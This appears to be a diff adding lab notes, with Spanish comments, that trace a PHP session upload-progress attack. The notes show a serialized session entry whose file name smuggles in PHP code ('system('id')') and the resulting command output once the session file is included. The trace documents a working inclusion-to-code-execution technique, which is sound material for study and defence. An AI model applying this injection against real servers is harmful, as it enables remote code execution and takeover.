@@ -1,0 +1,7 @@
+# sesion creada por el cliente
+-rw------- 1 www-data www-data 0 Nov  2 11:17 /tmp/sess_prueba123
+# subida colgada y nota en la sesion
+[1] 34565
+upload_progress_pwn|a:5:{s:10:"start_time";i:1793618335;s:14:"content_length";i:400339;s:15:"bytes_processed";i:25881;s:4:"done";b:0;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:4:"file";s:4:"name";s:24:"<?php system('id')?>.txt";s:8:"tmp_name";N;s:5:"error";i:0;s:4:"done";b:0;s:10:"start_time";i:1793618335;s:15:"bytes_processed";i:25595;}}}
+# ejecucion mediante include
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
